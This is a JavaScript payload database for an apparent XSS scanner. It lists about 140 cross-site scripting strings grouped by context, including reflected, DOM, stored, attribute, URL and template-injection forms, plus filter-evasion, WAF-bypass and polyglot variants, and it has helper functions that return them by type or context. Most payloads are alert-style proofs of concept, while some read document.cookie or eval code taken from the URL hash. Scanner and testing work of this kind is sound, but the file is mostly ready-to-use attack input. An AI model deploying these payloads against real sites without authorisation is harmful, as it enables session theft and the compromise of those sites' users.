// XSS (Cross-Site Scripting) Payloads Database
// Comprehensive collection of XSS payloads for automated testing

const XSSPayloads = {
    // Basic reflected XSS
    reflected: [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>prompt(1)</script>",
        "<script>confirm(1)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(/XSS/)</script>",
        "<script>alert`1`</script>",
        "<script>alert(window.origin)</script>"
    ],

    // Image-based XSS
    imageBased: [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=prompt(1)>",
        "<img src=x onerror=confirm(1)>",
        "<img src=x onerror=alert(document.domain)>",
        "<img src=x onerror=alert(document.cookie)>",
        "<img src=x onerror=\"alert(1)\">",
        "<img src=x onerror='alert(1)'>",
        "<img src onerror=alert(1)>",
        "<img/src=x/onerror=alert(1)>"
    ],

    // SVG-based XSS
    svgBased: [
        "<svg onload=alert(1)>",
        "<svg onload=alert('XSS')>",
        "<svg onload=prompt(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(document.domain)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1)>",
        "<svg><set attributeName=onmouseover to=alert(1)>",
        "<svg><foreignObject><body onload=alert(1)></foreignObject>",
        "<svg><a xlink:href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">XSS</text></a></svg>"
    ],

    // Event handler XSS
    eventHandlers: [
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video onloadstart=alert(1) src=x>",
        "<audio onloadstart=alert(1) src=x>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<iframe onload=alert(1)>",
        "<object data=\"javascript:alert(1)\">",
        "<embed src=\"javascript:alert(1)\">",
        "<form><button formaction=javascript:alert(1)>XSS</button>",
        "<input type=\"image\" src=x onerror=alert(1)>",
        "<isindex type=image src=x onerror=alert(1)>"
    ],

    // DOM-based XSS
    domBased: [
        "<script>eval(location.hash.slice(1))</script>",
        "<script>document.write(location.hash)</script>",
        "<script>innerHTML=location.hash</script>",
        "<img src=x onerror=eval(atob(location.hash.slice(1)))>",
        "<iframe src=javascript:alert(document.domain)>",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        "<embed src=\"data:text/html,<script>alert(1)</script>\">"
    ],

    // Filter bypass - case variation
    caseBypass: [
        "<ScRiPt>alert(1)</sCrIpT>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<sCrIpT>alert(1)</ScRiPt>",
        "<IMG SRC=x ONERROR=alert(1)>",
        "<ImG sRc=x OnErRoR=alert(1)>",
        "<SVG ONLOAD=alert(1)>",
        "<SvG oNlOaD=alert(1)>"
    ],

    // Filter bypass - encoding
    encodingBypass: [
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
    ],

    // Filter bypass - null bytes and special chars
    nullByteBypass: [
        "<script>alert(1)//",
        "<script>alert(1)<!--",
        "<script>alert(1)/*",
        "<img src=x onerror=alert(1)//",
        "<svg/onload=alert(1)//",
        "<iframe src=javascript:alert(1)//>"
    ],

    // Filter bypass - tag breaking
    tagBreaking: [
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "</script><script>alert(1)</script>",
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
        "'><svg onload=alert(1)>",
        "\" autofocus onfocus=alert(1) x=\"",
        "' autofocus onfocus=alert(1) x='",
        "\"/><script>alert(1)</script>",
        "'/><script>alert(1)</script>"
    ],

    // JavaScript context
    jsContext: [
        "'-alert(1)-'",
        "\"-alert(1)-\"",
        "';alert(1)//",
        "\";alert(1)//",
        "</script><script>alert(1)</script>",
        "'-alert(document.domain)-'",
        "'-alert(document.cookie)-'",
        "';alert(String.fromCharCode(88,83,83))//",
        "\";alert(String.fromCharCode(88,83,83))//"
    ],

    // Attribute context
    attributeContext: [
        "\" onmouseover=\"alert(1)",
        "' onmouseover='alert(1)",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        "' onfocus='alert(1)' autofocus='",
        "\" style=\"background:url('javascript:alert(1)')",
        "' style='background:url('javascript:alert(1)')",
        "\" onclick=\"alert(1)",
        "' onclick='alert(1)"
    ],

    // URL context
    urlContext: [
        "javascript:alert(1)",
        "javascript:alert('XSS')",
        "javascript:alert(document.domain)",
        "javascript:alert(document.cookie)",
        "javascript:prompt(1)",
        "javascript:confirm(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],

    // Polyglot XSS
    polyglot: [
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\"><img src=x onerror=alert(1)>",
        "\"><svg/onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
    ],

    // WAF bypass
    wafBypass: [
        "<script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<scr\\x00ipt>alert(1)</scr\\x00ipt>",
        "<<SCRIPT>alert(1);//<</SCRIPT>",
        "<script>al\\u0065rt(1)</script>",
        "<script>al\\x65rt(1)</script>",
        "<iframe src=\"javas\\tcript:alert(1)\">",
        "<iframe src=\"javas\\ncript:alert(1)\">",
        "<img src=x onerror=\\u0061lert(1)>",
        "<img src=x onerror=\\x61lert(1)>"
    ],

    // Template injection
    templateInjection: [
        "{{alert(1)}}",
        "${alert(1)}",
        "#{alert(1)}",
        "*{alert(1)}",
        "@{alert(1)}",
        "{{constructor.constructor('alert(1)')()}}",
        "${7*7}",
        "{{7*7}}",
        "<%= 7*7 %>"
    ],

    // AngularJS XSS
    angularjs: [
        "{{constructor.constructor('alert(1)')()}}",
        "{{$on.constructor('alert(1)')()}}",
        "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a','alert(1)'].sort(toString.constructor)}}",
        "{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}",
        "{{[].pop.constructor('alert(1)')()}}"
    ],

    // React XSS
    react: [
        "<img src=x onerror={alert(1)}>",
        "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>",
        "javascript:alert(1)",
        "{alert(1)}"
    ],

    // Stored XSS
    stored: [
        "<script>alert('Stored XSS')</script>",
        "<img src=x onerror=alert('Stored XSS')>",
        "<svg onload=alert('Stored XSS')>",
        "<iframe src=javascript:alert('Stored XSS')>",
        "<body onload=alert('Stored XSS')>"
    ]
};

// Get all payloads for a specific attack type
function getXSSPayloadsByType(type) {
    return XSSPayloads[type] || [];
}

// Get all XSS payloads
function getAllXSSPayloads() {
    const all = [];
    for (const type in XSSPayloads) {
        all.push(...XSSPayloads[type].map(payload => ({
            type: type,
            payload: payload
        })));
    }
    return all;
}

// Get payload count
function getXSSPayloadCount() {
    let count = 0;
    for (const type in XSSPayloads) {
        count += XSSPayloads[type].length;
    }
    return count;
}

// Get payloads by context
function getPayloadsByContext(context) {
    const contextMap = {
        'html': ['reflected', 'imageBased', 'svgBased', 'eventHandlers'],
        'attribute': ['attributeContext', 'tagBreaking'],
        'js': ['jsContext', 'templateInjection'],
        'url': ['urlContext', 'domBased']
    };

    const types = contextMap[context] || [];
    const payloads = [];

    for (const type of types) {
        if (XSSPayloads[type]) {
            payloads.push(...XSSPayloads[type].map(payload => ({
                type: type,
                payload: payload
            })));
        }
    }

    return payloads;
}

// Export for use in scanner
if (typeof module !== 'undefined' && module.exports) {
    module.exports = {
        XSSPayloads,
        getXSSPayloadsByType,
        getAllXSSPayloads,
        getXSSPayloadCount,
        getPayloadsByContext
    };
}
